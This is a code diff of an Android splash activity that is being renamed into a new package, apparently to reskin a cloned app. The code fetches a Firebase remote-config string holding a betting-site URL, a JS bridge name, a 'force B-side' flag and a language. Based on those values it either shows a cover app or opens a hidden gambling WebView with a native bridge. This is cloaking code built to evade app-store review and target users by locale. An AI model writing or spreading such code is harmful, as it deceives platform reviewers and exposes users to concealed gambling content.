@@ -1,22 +1,22 @@
-package com.abcdgame.game.b
+package om.lemon.laoban.debug.b
 
 import android.content.Context
 import android.content.Intent
 import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
-import com.abcdgame.game.R
-import com.abcdgame.game.a.AActivity
-import com.abcdgame.game.b.Diaview1.jsBridgeObjName
-import com.abcdgame.game.b.Diaview1.loadUrl
 import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig
 import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
+import om.lemon.laoban.debug.R
+import om.lemon.laoban.debug.a.AActivity
+import om.lemon.laoban.debug.b.BWebViewActivity.jsBridgeObjName
+import om.lemon.laoban.debug.b.BWebViewActivity.loadUrl
 import java.util.Locale
 
 
-class DiamondWelActivity : AppCompatActivity() {
+class BWelcomeSplashActivity : AppCompatActivity() {
 
     lateinit var context: Context
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -35,7 +35,9 @@ class DiamondWelActivity : AppCompatActivity() {
         mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings)
         mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this) {
             //applicationId "om.lemon.laoban.debug"
-            val datas = mFirebaseRemoteConfig.getString("debug");//appid最后一个单词
+            //applicationId "om.lemon.laoban.debug"
+            //applicationId "om.lemon.laoban.debug"
+            val datas = mFirebaseRemoteConfig.getString("debug");//appid的最后一个单词
             Log.d("TAG", "datas=$datas")
 
             try {
@@ -70,8 +72,8 @@ class DiamondWelActivity : AppCompatActivity() {
 
                 //      5QuCD5K3NpGE346dYU7SCF>https://www.abcd33.bet?pid=1121>apkClient>1>pt
                 AppsFlyerLib.getInstance().start(applicationContext)
-                Diaview1.loadUrl = datas.split(">")[1]
-                Diaview1.jsBridgeObjName =
+                BWebViewActivity.loadUrl = datas.split(">")[1]
+                BWebViewActivity.jsBridgeObjName =
                     datas.split(">")[2] //apkClient
                 val flag = datas.split(">")[3]//强制进入B面=1
                 val language = datas.split(">")[4]//pt
@@ -85,7 +87,7 @@ class DiamondWelActivity : AppCompatActivity() {
                 // 创建Locale对象
                 // 获取当前手机设置的语言
                 if (language.contains(Locale.getDefault().language) || flag == "1") {
-                    val intent = Intent(context, Diaview1::class.java)
+                    val intent = Intent(context, BWebViewActivity::class.java)
                     startActivity(intent)
                     finish()
                 } else {
